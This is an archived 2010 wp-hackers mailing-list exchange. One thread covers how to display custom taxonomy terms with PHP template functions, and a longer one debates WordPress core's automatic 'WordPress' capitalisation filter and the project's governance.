From jimmy.roy at gmail.com  Mon Jul  5 10:39:24 2010
From: jimmy.roy at gmail.com (Jimmy Roy)
Date: Mon, 5 Jul 2010 18:39:24 +0800
Subject: [wp-hackers] display the list of new taxonomy
In-Reply-To: <BD6595C3-D0C7-48D6-9597-9CA3BF5DCE70@newclarity.net>
References: <AANLkTikp71c-bwZ9GEd6AQrAr7gYrRTlgA3u4nD1xg33@mail.gmail.com>
	<7D478DE4-0EAF-4F71-A1B1-CAB19764BAE7@newclarity.net>
	<AANLkTikMkxSpTD7FjC0duZZo6ezMFqq5ckQ7jWIEJT4w@mail.gmail.com>
	<BD6595C3-D0C7-48D6-9597-9CA3BF5DCE70@newclarity.net>
Message-ID: <AANLkTinUe5TiB47LOiGiXU1Hy7uNjUwSVltZOHahlsr7@mail.gmail.com>

thank u guys!

I will try now.

Jimmy


2010/7/3 Mike Schinkel <mikeschinkel at newclarity.net>

> On Jul 2, 2010, at 2:40 PM, scribu wrote:
> > Actually, there's a template tag for that:
> >
> > the_taxonomies()<
> http://xref.yoast.com/trunk/nav.html?_functions/the_taxonomies.html>
>
> That's similar, but not identical. For example, if he had 2 taxonomies
> (i.e. Actor, Genre) the following:
>
>
>  the_taxonomies(array('post'=>$post->ID,'before'=>'<ul><li>','sep'=>'</li><li>','after'=>'</li></ul>'));
>
> Could generate this HTML where the taxonomies are bulleted, not the terms:
>
>        - Actor: Brad Pitt, Georges Clooney,  ...
>        - Genre: Comedy, Drama, ...
>
> On Jul 2, 2010, at 2:44 PM, Andrew Nacin wrote:
> > And, wp_list_categories() takes a taxonomy arg as well.
>
>
> Yes, the following will create an equivalent list of all Actors:
>
>
>  wp_list_categories(array('taxonomy'=>'practice-area','title_li'=>''));
>
> But as far as I can tell there's no easy way to get it to limit to Actors
> that are associated with a specific Movie.  Am I missing something?
>
> -Mike
>
> >
> >
> > On Fri, Jul 2, 2010 at 9:13 PM, Mike Schinkel
> > <mikeschinkel at newclarity.net>wrote:
> >
> >> Hi Jimmy,
> >>
> >> I'm assuming that you know how to create a sidebar widget so I'll skip
> that
> >> step.  Here's the basic code you need:
> >>
> >>       // $post is assumed to be a post for a Movie
> >>       $actors = wp_get_object_terms($post->ID,'actor');
> >>       echo '<ul>';
> >>       foreach($actors as $actor) {
> >>               echo '<li>';
> >>               echo $actor->name;
> >>               echo '</li>';
> >>       }
> >>       echo '</ul>';
> >>
> >> Hope it helps.
> >>
> >> -Mike
> >>
> >> On Jul 2, 2010, at 12:32 PM, Jimmy Roy wrote:
> >>
> >>> sorry for double post, I forgot to change the message object.
> >>>
> >>> hi all,
> >>> I just start to play with custom post type and custom taxonomies.
> >>> I follow the excellent tutorial by Justin Tadlock everything works
> fine,
> >> now
> >>> I want to display the list of taxonomies associate to my new custom
> post
> >>> type (something like wp_list_categories()).
> >>>
> >>> for example I create a new custom post type called Movie and a taxonomy
> >>> called Actor.
> >>>
> >>> I want to display in the sidebar :
> >>> *Actors*
> >>>
> >>>  - Brad Pitt
> >>>  - Georges Clooney
> >>>  - ...
> >>>
> >>> any idea to do that?
> >>>
> >>> thank u for your help.
> >>>
> >>> Jimmy
> >>> _______________________________________________
> >>> wp-hackers mailing list
> >>> wp-hackers at lists.automattic.com
> >>> http://lists.automattic.com/mailman/listinfo/wp-hackers
> >>
> >> _______________________________________________
> >> wp-hackers mailing list
> >> wp-hackers at lists.automattic.com
> >> http://lists.automattic.com/mailman/listinfo/wp-hackers
> >>
> >
> >
> >
> > --
> > http://scribu.net
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From m at mullenweg.com  Mon Jul  5 15:14:33 2010
From: m at mullenweg.com (Matt Mullenweg)
Date: Mon, 05 Jul 2010 11:14:33 -0400
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <AANLkTikAfcLyJEVAQ2lREq1Vk97HLrx1DQGyYZVZrpEc@mail.gmail.com>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>	<AANLkTikZRF9A08Faf6mjZ46TRHx3O6Z6CtNyP__Bxx4D@mail.gmail.com>	<AANLkTimnYIO08tTY4ejTwXMu66Es0cVSfKixTWPipz9Q@mail.gmail.com>	<4C2ED16D.9050907@szub.net>
	<001201cb1aa2$e1c9bd30$a55d3790$@com>
	<AANLkTikAfcLyJEVAQ2lREq1Vk97HLrx1DQGyYZVZrpEc@mail.gmail.com>
Message-ID: <4C31F6D9.4@mullenweg.com>

On 7/3/2010 5:42 PM, John Blackbourn wrote:
> There's some discussion here around problems that this feature may
> cause some people:http://core.trac.wordpress.org/ticket/13971

People seem fundamentally uncomfortable with the idea of acceptable edge 
cases.

-- 
Matt Mullenweg
http://ma.tt | http://wordpress.org | http://automattic.com

From harry at thedextrousweb.com  Mon Jul  5 15:22:40 2010
From: harry at thedextrousweb.com (Harry Metcalfe)
Date: Mon, 5 Jul 2010 16:22:40 +0100
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <4C31F6D9.4@mullenweg.com>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>
	<AANLkTikZRF9A08Faf6mjZ46TRHx3O6Z6CtNyP__Bxx4D@mail.gmail.com>
	<AANLkTimnYIO08tTY4ejTwXMu66Es0cVSfKixTWPipz9Q@mail.gmail.com>
	<4C2ED16D.9050907@szub.net> <001201cb1aa2$e1c9bd30$a55d3790$@com>
	<AANLkTikAfcLyJEVAQ2lREq1Vk97HLrx1DQGyYZVZrpEc@mail.gmail.com>
	<4C31F6D9.4@mullenweg.com>
Message-ID: <DA52D7A7-C61B-4718-BFA4-52B91D4341B6@thedextrousweb.com>

It's nothing at all to do with edge cases. Per my several posts on that ticket.

Harry

--
Harry Metcalfe
07790 559 876
@harrym, @dextrousweb

Sent from my phone (please excuse any brevity!) 

On 5 Jul 2010, at 16:14, Matt Mullenweg <m at mullenweg.com> wrote:

> On 7/3/2010 5:42 PM, John Blackbourn wrote:
>> There's some discussion here around problems that this feature may
>> cause some people:http://core.trac.wordpress.org/ticket/13971
> 
> People seem fundamentally uncomfortable with the idea of acceptable edge cases.
> 
> -- 
> Matt Mullenweg
> http://ma.tt | http://wordpress.org | http://automattic.com
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

From ncrice at gmail.com  Mon Jul  5 15:22:32 2010
From: ncrice at gmail.com (Nathan Rice)
Date: Mon, 5 Jul 2010 11:22:32 -0400
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <4C31F6D9.4@mullenweg.com>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>
	<AANLkTikZRF9A08Faf6mjZ46TRHx3O6Z6CtNyP__Bxx4D@mail.gmail.com>
	<AANLkTimnYIO08tTY4ejTwXMu66Es0cVSfKixTWPipz9Q@mail.gmail.com>
	<4C2ED16D.9050907@szub.net> <001201cb1aa2$e1c9bd30$a55d3790$@com>
	<AANLkTikAfcLyJEVAQ2lREq1Vk97HLrx1DQGyYZVZrpEc@mail.gmail.com>
	<4C31F6D9.4@mullenweg.com>
Message-ID: <AANLkTimBC8LmcHPcawzmGxBxVea79-iclOmHge24seHg@mail.gmail.com>

On Mon, Jul 5, 2010 at 11:14 AM, Matt Mullenweg <m at mullenweg.com> wrote:

>
> People seem fundamentally uncomfortable with the idea of acceptable edge
> cases.
>
>
That may very well be true. But what also seems to be true is the fact that
people are fundamentally uncomfortable with the idea that their CMS might
alter their content, without opt-in consent.

From elflop at googlemail.com  Mon Jul  5 15:53:55 2010
From: elflop at googlemail.com (elflop at googlemail.com)
Date: Mon, 05 Jul 2010 15:53:55 +0000
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <AANLkTimBC8LmcHPcawzmGxBxVea79-iclOmHge24seHg@mail.gmail.com>
Message-ID: <0016367fb2c3a23505048aa5f18f@google.com>

(apologies Nathan, forgot Google doesn't auto send back to the list)

I haven't got a login for Trac, but the issue being discussed was covered  
in an acronym plugin some time ago.
http://wordpress.org/extend/plugins/acronyms/
the portion of code he ended up using was:
function acronym_replace ( $text )
{
$acronyms = get_option( 'acronym_acronyms' );
$text = " $text ";
foreach ( $acronyms as $acronym => $fulltext )
$text = preg_replace( "|(?!<[^<>]*?)(?<![?.&])\b$acronym\b(?!:)(?![^<>]*?>)| 
msU", "<acronym title=\"$fulltext\">$acronym</acronym>" , $text );
$text = trim($text);
return $text;
}


so is that preg_replace of any use here?

Rich

From johnbillion+wp at gmail.com  Mon Jul  5 15:58:52 2010
From: johnbillion+wp at gmail.com (John Blackbourn)
Date: Mon, 5 Jul 2010 16:58:52 +0100
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <0016367fb2c3a23505048aa5f18f@google.com>
References: <AANLkTimBC8LmcHPcawzmGxBxVea79-iclOmHge24seHg@mail.gmail.com>
	<0016367fb2c3a23505048aa5f18f@google.com>
Message-ID: <AANLkTil90gktZNWecaPbRPxSh6GRqvhwsh48PleTFtE7@mail.gmail.com>

On Mon, Jul 5, 2010 at 4:53 PM,  <elflop at googlemail.com> wrote:
>
> so is that preg_replace of any use here?
>
> Rich

There's some discussion on that ticket that regexes use a
disproportionately high amount of processing power for the small
amount to be gained in this particular scenario, so if this
functionality isn't going to be pulled then it would be preferred to
use a string replace (as per Mark Jaquith's suggestions on that
ticket) rather than a regex replace.

From johnbillion+wp at gmail.com  Mon Jul  5 16:00:17 2010
From: johnbillion+wp at gmail.com (John Blackbourn)
Date: Mon, 5 Jul 2010 17:00:17 +0100
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <0016367fb2c3a23505048aa5f18f@google.com>
References: <AANLkTimBC8LmcHPcawzmGxBxVea79-iclOmHge24seHg@mail.gmail.com>
	<0016367fb2c3a23505048aa5f18f@google.com>
Message-ID: <AANLkTikp_UkrDM1zTVVbRFEJv8izhwK5WltwYaEit_cM@mail.gmail.com>

On Mon, Jul 5, 2010 at 4:53 PM,  <elflop at googlemail.com> wrote:

> I haven't got a login for Trac, but...

FYI your wordpress.org login works on Trac, if you have one.

From m at mullenweg.com  Mon Jul  5 16:15:05 2010
From: m at mullenweg.com (Matt Mullenweg)
Date: Mon, 05 Jul 2010 12:15:05 -0400
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <0016367fb2c3a23505048aa5f18f@google.com>
References: <0016367fb2c3a23505048aa5f18f@google.com>
Message-ID: <4C320509.9060704@mullenweg.com>

On 7/5/2010 11:53 AM, elflop at googlemail.com wrote:
> so is that preg_replace of any use here?

It'd be more generally useful to have something like we used to have in 
balanceTags that lets filters hook in outside of HTML elements, but 
still high overhead.

-- 
Matt Mullenweg
http://ma.tt | http://wordpress.org | http://automattic.com

From m at mullenweg.com  Mon Jul  5 16:17:36 2010
From: m at mullenweg.com (Matt Mullenweg)
Date: Mon, 05 Jul 2010 12:17:36 -0400
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <AANLkTimBC8LmcHPcawzmGxBxVea79-iclOmHge24seHg@mail.gmail.com>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>	<AANLkTikZRF9A08Faf6mjZ46TRHx3O6Z6CtNyP__Bxx4D@mail.gmail.com>	<AANLkTimnYIO08tTY4ejTwXMu66Es0cVSfKixTWPipz9Q@mail.gmail.com>	<4C2ED16D.9050907@szub.net>
	<001201cb1aa2$e1c9bd30$a55d3790$@com>	<AANLkTikAfcLyJEVAQ2lREq1Vk97HLrx1DQGyYZVZrpEc@mail.gmail.com>	<4C31F6D9.4@mullenweg.com>
	<AANLkTimBC8LmcHPcawzmGxBxVea79-iclOmHge24seHg@mail.gmail.com>
Message-ID: <4C3205A0.4020100@mullenweg.com>

On 7/5/2010 11:22 AM, Nathan Rice wrote:
> That may very well be true. But what also seems to be true is the fact that
> people are fundamentally uncomfortable with the idea that their CMS might
> alter their content, without opt-in consent.

Content Darwinism. ;)

-- 
Matt Mullenweg
http://ma.tt | http://wordpress.org | http://automattic.com

From cross at thisismyurl.com  Mon Jul  5 16:58:56 2010
From: cross at thisismyurl.com (Christopher Ross)
Date: Mon, 5 Jul 2010 13:58:56 -0300
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <AANLkTimBC8LmcHPcawzmGxBxVea79-iclOmHge24seHg@mail.gmail.com>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>
	<AANLkTikZRF9A08Faf6mjZ46TRHx3O6Z6CtNyP__Bxx4D@mail.gmail.com>
	<AANLkTimnYIO08tTY4ejTwXMu66Es0cVSfKixTWPipz9Q@mail.gmail.com>
	<4C2ED16D.9050907@szub.net> <001201cb1aa2$e1c9bd30$a55d3790$@com>
	<AANLkTikAfcLyJEVAQ2lREq1Vk97HLrx1DQGyYZVZrpEc@mail.gmail.com>
	<4C31F6D9.4@mullenweg.com>
	<AANLkTimBC8LmcHPcawzmGxBxVea79-iclOmHge24seHg@mail.gmail.com>
Message-ID: <24678A4D-F674-4DE0-96DF-F3DA6DADE3EA@thisismyurl.com>


On 2010-07-05, at 12:22 PM, Nathan Rice wrote:

>> People seem fundamentally uncomfortable with the idea of acceptable edge
>> cases.
>> 
>> 
> That may very well be true. But what also seems to be true is the fact that
> people are fundamentally uncomfortable with the idea that their CMS might
> alter their content, without opt-in consent.

I'm with you 100% on this Nathan. I think protecting the brand is great but altering content without permission is creepy and compare it to if Microsoft started altering words in a users Word doc without permission. 

Perhaps a better solution would be to add a spell check rule to the TinyMCE which annoys people into fixing it, rather than doing it behind their backs.
__

Christopher Ross

Toronto      1 (416) 840-5828
Fredericton 1 (506) 474-2708

http://christopherross.ca
http://www.thisismyurl.com


From elflop at googlemail.com  Mon Jul  5 17:42:51 2010
From: elflop at googlemail.com (elflop at googlemail.com)
Date: Mon, 05 Jul 2010 17:42:51 +0000
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <24678A4D-F674-4DE0-96DF-F3DA6DADE3EA@thisismyurl.com>
Message-ID: <0016e657afb442c1dd048aa77732@google.com>

On , Christopher Ross <cross at thisismyurl.com> wrote:

> Perhaps a better solution would be to add a spell check rule to the  
> TinyMCE which annoys people into fixing it, rather than doing it behind  
> their backs.

better solution? not so sure, but adding it to the spell checker would be  
an excellent idea (provided of course it is possible to do).

Rich

From curtis at curtismchale.ca  Mon Jul  5 17:44:11 2010
From: curtis at curtismchale.ca (Curtis Work)
Date: Mon, 5 Jul 2010 10:44:11 -0700
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <0016e657afb442c1dd048aa77732@google.com>
References: <0016e657afb442c1dd048aa77732@google.com>
Message-ID: <45D7366E-90FB-44A1-9112-5F3BB97078F0@curtismchale.ca>

I'd also vote for the spell checker. 

Curtis McHale
Http://www.curtismchale.com
604.751.3482

On 2010-07-05, at 10:42 AM, elflop at googlemail.com wrote:

> On , Christopher Ross <cross at thisismyurl.com> wrote:
> 
>> Perhaps a better solution would be to add a spell check rule to the TinyMCE which annoys people into fixing it, rather than doing it behind their backs.
> 
> better solution? not so sure, but adding it to the spell checker would be an excellent idea (provided of course it is possible to do).
> 
> Rich
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

From elflop at googlemail.com  Mon Jul  5 17:44:39 2010
From: elflop at googlemail.com (elflop at googlemail.com)
Date: Mon, 05 Jul 2010 17:44:39 +0000
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <4C320509.9060704@mullenweg.com>
Message-ID: <0016e657afb4aa318d048aa77d66@google.com>

On , Matt Mullenweg <m at mullenweg.com> wrote:
> On 7/5/2010 11:53 AM, elflop at googlemail.com wrote:


> so is that preg_replace of any use here?


> It'd be more generally useful to have something like we used to have in  
> balanceTags that lets filters hook in outside of HTML elements, but still  
> high overhead.

How about if it was run at save time, rather than when a post is viewed?

Rich

From m at mullenweg.com  Mon Jul  5 18:13:17 2010
From: m at mullenweg.com (Matt Mullenweg)
Date: Mon, 05 Jul 2010 14:13:17 -0400
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <0016e657afb4aa318d048aa77d66@google.com>
References: <0016e657afb4aa318d048aa77d66@google.com>
Message-ID: <4C3220BD.4020501@mullenweg.com>

On 7/5/2010 1:44 PM, elflop at googlemail.com wrote:
> How about if it was run at save time, rather than when a post is viewed?

To me that's destructive, because it impacts the fidelity of the data in 
the database. A filter on output is trivial to add, remove, update, etc. 
Every one of our output filters, from autop to texturize, is imperfect 
but gets better.

The "damage" the P function could do has already been done. People have 
already fixed their sites if it broke anything. The sky did not fall. 
The exact same function has been running on WP.com for several years.

If it helps, think of this as one of those quirks that you sometimes 
love, sometimes disagree with, but ultimately separates WordPress from 
the 1,000 other generic, soulless, un-opinionated CMSes that flood the 
market. We have made you a beautiful omelet, sorry about the eggs! 
Except not really sorry.

-- 
Matt Mullenweg
http://ma.tt | http://wordpress.org | http://automattic.com

From elflop at googlemail.com  Mon Jul  5 19:40:45 2010
From: elflop at googlemail.com (elflop at googlemail.com)
Date: Mon, 05 Jul 2010 19:40:45 +0000
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <4C3220BD.4020501@mullenweg.com>
Message-ID: <0015174c437cdb7544048aa91c21@google.com>

On , Matt Mullenweg <m at mullenweg.com> wrote:


> If it helps, think of this as one of those quirks that you sometimes  
> love, sometimes disagree with, but ultimately separates WordPress from  
> the 1,000 other generic, soulless, un-opinionated CMSes that flood the  
> market. We have made you a beautiful omelet, sorry about the eggs! Except  
> not really sorry.


nice ;)

I personally am not complaining, I have a tendency to spell WordPress wrong  
all the time, so I'm glad it's there.

Rich

From kikizas at gmail.com  Mon Jul  5 20:21:43 2010
From: kikizas at gmail.com (Demetris)
Date: Mon, 5 Jul 2010 23:21:43 +0300
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <4C3220BD.4020501@mullenweg.com>
References: <0016e657afb4aa318d048aa77d66@google.com>
	<4C3220BD.4020501@mullenweg.com>
Message-ID: <AANLkTinOe6Z_MUT3tqKtDITi-GK8D94wMbntbGNt-94A@mail.gmail.com>

On Mon, Jul 5, 2010 at 9:13 PM, Matt Mullenweg <m at mullenweg.com> wrote:
>
> If it helps, think of this as one of those quirks that you sometimes love,
> sometimes disagree with, but ultimately separates WordPress from the 1,000
> other generic, soulless, un-opinionated CMSes that flood the market. We have
> made you a beautiful omelet, sorry about the eggs! Except not really sorry.
>
I believe it would help more if we thought of this as one of those
cases that explain why WordPress needs a better form of governance.
;-)

I am thinking of a setup that would not permit anyone to act as if
WordPress were their own personal project (we are beyond the point
where that could still be beneficial) and that would enforce
meritocracy at every level, down to the evaluation of the slightest
change or proposed change.

(About the ?generic, soulless? etc. argument, you know that I agree
with you on that in general, and I have said so in the past, but I
think that in this particular case you are taking it too far, to the
point of undermining the general idea.)

Cheers!

Demetris
http://op111.net/76 ? See what is new in WordPress 3.0!

From harry at thedextrousweb.com  Mon Jul  5 20:31:47 2010
From: harry at thedextrousweb.com (Harry Metcalfe)
Date: Mon, 5 Jul 2010 21:31:47 +0100
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <4C3220BD.4020501@mullenweg.com>
References: <0016e657afb4aa318d048aa77d66@google.com>
	<4C3220BD.4020501@mullenweg.com>
Message-ID: <76093112-4557-47CC-A0BC-03C575646F7A@thedextrousweb.com>

Benevolent dictatorships are fine as long as they're benevolent. Using your position to enforce you pedantries on my blog is not benevolent.

I agree with elflop.

--
Harry Metcalfe
07790 559 876
@harrym, @dextrousweb

Sent from my phone (please excuse any brevity!) 

On 5 Jul 2010, at 19:13, Matt Mullenweg <m at mullenweg.com> wrote:

> On 7/5/2010 1:44 PM, elflop at googlemail.com wrote:
>> How about if it was run at save time, rather than when a post is viewed?
> 
> To me that's destructive, because it impacts the fidelity of the data in the database. A filter on output is trivial to add, remove, update, etc. Every one of our output filters, from autop to texturize, is imperfect but gets better.
> 
> The "damage" the P function could do has already been done. People have already fixed their sites if it broke anything. The sky did not fall. The exact same function has been running on WP.com for several years.
> 
> If it helps, think of this as one of those quirks that you sometimes love, sometimes disagree with, but ultimately separates WordPress from the 1,000 other generic, soulless, un-opinionated CMSes that flood the market. We have made you a beautiful omelet, sorry about the eggs! Except not really sorry.
> 
> -- 
> Matt Mullenweg
> http://ma.tt | http://wordpress.org | http://automattic.com
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

From m at mullenweg.com  Mon Jul  5 20:37:59 2010
From: m at mullenweg.com (Matt Mullenweg)
Date: Mon, 05 Jul 2010 16:37:59 -0400
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <76093112-4557-47CC-A0BC-03C575646F7A@thedextrousweb.com>
References: <0016e657afb4aa318d048aa77d66@google.com>	<4C3220BD.4020501@mullenweg.com>
	<76093112-4557-47CC-A0BC-03C575646F7A@thedextrousweb.com>
Message-ID: <4C3242A7.60600@mullenweg.com>

On 7/5/2010 4:31 PM, Harry Metcalfe wrote:
> Benevolent dictatorships are fine as long as they're benevolent. Using your position to enforce you pedantries on my blog is not benevolent.

No one can force anything on your blog. You run Open Source software 
with a robust action and filter framework -- you have more flexibility 
and control on your blog than most people do in their lives.

-- 
Matt Mullenweg
http://ma.tt | http://wordpress.org | http://automattic.com

From ncrice at gmail.com  Mon Jul  5 20:39:01 2010
From: ncrice at gmail.com (Nathan Rice)
Date: Mon, 5 Jul 2010 16:39:01 -0400
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <76093112-4557-47CC-A0BC-03C575646F7A@thedextrousweb.com>
References: <0016e657afb4aa318d048aa77d66@google.com>
	<4C3220BD.4020501@mullenweg.com>
	<76093112-4557-47CC-A0BC-03C575646F7A@thedextrousweb.com>
Message-ID: <AANLkTinvB0Za2RKKn72flLvQwRf_r69xu8ty8DNo7xml@mail.gmail.com>

On Mon, Jul 5, 2010 at 4:31 PM, Harry Metcalfe <harry at thedextrousweb.com>wrote:

> Benevolent dictatorships are fine as long as they're benevolent. Using your
> position to enforce you pedantries on my blog is not benevolent.
>

Speaking politically, the "benevolent dictator" is a mythical creature. Any
benevolent man would never accept a dictatorship, and no dictator could ever
remain benevolent.

From harry at thedextrousweb.com  Mon Jul  5 20:40:16 2010
From: harry at thedextrousweb.com (Harry Metcalfe)
Date: Mon, 5 Jul 2010 21:40:16 +0100
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <4C3242A7.60600@mullenweg.com>
References: <0016e657afb4aa318d048aa77d66@google.com>
	<4C3220BD.4020501@mullenweg.com>
	<76093112-4557-47CC-A0BC-03C575646F7A@thedextrousweb.com>
	<4C3242A7.60600@mullenweg.com>
Message-ID: <9B883A5E-3C51-41D3-9C04-60470A400DE0@thedextrousweb.com>

It's true, I can :)

But most can't and I think it's an important point of principle that WP shouldn't make editorial changes.

H

--
Harry Metcalfe
07790 559 876
@harrym, @dextrousweb

Sent from my phone (please excuse any brevity!) 

On 5 Jul 2010, at 21:37, Matt Mullenweg <m at mullenweg.com> wrote:

> On 7/5/2010 4:31 PM, Harry Metcalfe wrote:
>> Benevolent dictatorships are fine as long as they're benevolent. Using your position to enforce you pedantries on my blog is not benevolent.
> 
> No one can force anything on your blog. You run Open Source software with a robust action and filter framework -- you have more flexibility and control on your blog than most people do in their lives.
> 
> -- 
> Matt Mullenweg
> http://ma.tt | http://wordpress.org | http://automattic.com
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

From harry at thedextrousweb.com  Mon Jul  5 20:47:05 2010
From: harry at thedextrousweb.com (Harry Metcalfe)
Date: Mon, 5 Jul 2010 21:47:05 +0100
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <AANLkTinvB0Za2RKKn72flLvQwRf_r69xu8ty8DNo7xml@mail.gmail.com>
References: <0016e657afb4aa318d048aa77d66@google.com>
	<4C3220BD.4020501@mullenweg.com>
	<76093112-4557-47CC-A0BC-03C575646F7A@thedextrousweb.com>
	<AANLkTinvB0Za2RKKn72flLvQwRf_r69xu8ty8DNo7xml@mail.gmail.com>
Message-ID: <7ED66F01-4AE5-45B0-A481-1AA935610463@thedextrousweb.com>

Touch?! 

--
Harry Metcalfe
07790 559 876
@harrym, @dextrousweb

Sent from my phone (please excuse any brevity!) 

On 5 Jul 2010, at 21:39, Nathan Rice <ncrice at gmail.com> wrote:

> On Mon, Jul 5, 2010 at 4:31 PM, Harry Metcalfe <harry at thedextrousweb.com>wrote:
> 
>> Benevolent dictatorships are fine as long as they're benevolent. Using your
>> position to enforce you pedantries on my blog is not benevolent.
>> 
> 
> Speaking politically, the "benevolent dictator" is a mythical creature. Any
> benevolent man would never accept a dictatorship, and no dictator could ever
> remain benevolent.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

From Bulk at thecodecave.com  Mon Jul  5 21:17:31 2010
From: Bulk at thecodecave.com (Brian Layman)
Date: Mon, 5 Jul 2010 17:17:31 -0400
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <7ED66F01-4AE5-45B0-A481-1AA935610463@thedextrousweb.com>
References: <0016e657afb4aa318d048aa77d66@google.com>	<4C3220BD.4020501@mullenweg.com>	<76093112-4557-47CC-A0BC-03C575646F7A@thedextrousweb.com>	<AANLkTinvB0Za2RKKn72flLvQwRf_r69xu8ty8DNo7xml@mail.gmail.com>
	<7ED66F01-4AE5-45B0-A481-1AA935610463@thedextrousweb.com>
Message-ID: <002701cb1c87$8b36acd0$a1a40670$@thecodecave.com>

Before things get too violent, I'd like to remind people that this function is just implemented with an add_filter.  I just wrote a two line plugin (not counting comments) that removes this feature by calling remove_filter.  If this default behavior conflicts with your setup, ethics or digital morality, two lines can negate it. The behavior is added in the file "default-filters.php" and not buried deep in some hard coded core function.

-b



From arlenbee at gmail.com  Mon Jul  5 21:35:03 2010
From: arlenbee at gmail.com (Arlen Beiler)
Date: Mon, 5 Jul 2010 17:35:03 -0400
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <002701cb1c87$8b36acd0$a1a40670$@thecodecave.com>
References: <0016e657afb4aa318d048aa77d66@google.com>
	<4C3220BD.4020501@mullenweg.com> 
	<76093112-4557-47CC-A0BC-03C575646F7A@thedextrousweb.com> 
	<AANLkTinvB0Za2RKKn72flLvQwRf_r69xu8ty8DNo7xml@mail.gmail.com> 
	<7ED66F01-4AE5-45B0-A481-1AA935610463@thedextrousweb.com> 
	<002701cb1c87$8b36acd0$a1a40670$@thecodecave.com>
Message-ID: <AANLkTinY_21NNUBbITMYPamjTBvRR81qgKxBJhDBJJaN@mail.gmail.com>

A benevolent dictator is the same as the historical "just king". That is
totally possible, and well known to have happened. A dictator is a king with
full power. Not the kind of king that England has, but the kind of king like
the Pharaohs, Nebuchadnezzar, and most other kings you read about in the
Bible and other ancient books. That is what ancient kings were, *Benevolent
Dictators*

For the record, a dictator is someone who *is allowed to* dictate everything
about his subjects.
On Mon, Jul 5, 2010 at 5:17 PM, Brian Layman <Bulk at thecodecave.com> wrote:

> Before things get too violent, I'd like to remind people that this function
> is just implemented with an add_filter.  I just wrote a two line plugin (not
> counting comments) that removes this feature by calling remove_filter.  If
> this default behavior conflicts with your setup, ethics or digital morality,
> two lines can negate it. The behavior is added in the file
> "default-filters.php" and not buried deep in some hard coded core function.
>
> -b
>
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From admin at laptoptips.ca  Mon Jul  5 21:37:52 2010
From: admin at laptoptips.ca (Andrew Ozz)
Date: Mon, 05 Jul 2010 14:37:52 -0700
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <001201cb1aa2$e1c9bd30$a55d3790$@com>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>	<AANLkTikZRF9A08Faf6mjZ46TRHx3O6Z6CtNyP__Bxx4D@mail.gmail.com>	<AANLkTimnYIO08tTY4ejTwXMu66Es0cVSfKixTWPipz9Q@mail.gmail.com>	<4C2ED16D.9050907@szub.net>
	<001201cb1aa2$e1c9bd30$a55d3790$@com>
Message-ID: <4C3250B0.5070900@laptoptips.ca>

I'm still being amazed by how a well meant effort to correct a common 
spelling mistake can be turned into a .... (insert your favourite 
conspiracy theory here).

Grammatically "WordPress" is a name and "Wordpress" is the misspelled 
form of it. And that's in any language. You wouldn't type "Los angeles" 
or "San francisco", would you? Correcting the spelling _does not_ change 
the content or edit your post.

And yes, unfortunately there isn't more straightforward way of 
correcting that spelling. It could be added to the TinyMCE dictionary 
(would need a fair bit of coding since it uses Google spell by default 
but can use aspell/pspell on the server too). The problem is that most 
people usually use the browser's build-in spellchecker and there's no 
way of adding this in there.

From wp-hackers at nicolaskuttler.de  Mon Jul  5 21:41:00 2010
From: wp-hackers at nicolaskuttler.de (Nicolas Kuttler)
Date: Mon, 5 Jul 2010 23:41:00 +0200
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <45D7366E-90FB-44A1-9112-5F3BB97078F0@curtismchale.ca>
References: <0016e657afb442c1dd048aa77732@google.com>
	<45D7366E-90FB-44A1-9112-5F3BB97078F0@curtismchale.ca>
Message-ID: <20100705214100.GS23670@nicolaskuttler.de>

On Mon, Jul 05, 2010 at 10:44:11AM -0700, Curtis Work wrote:
> I'd also vote for the spell checker. 

+1

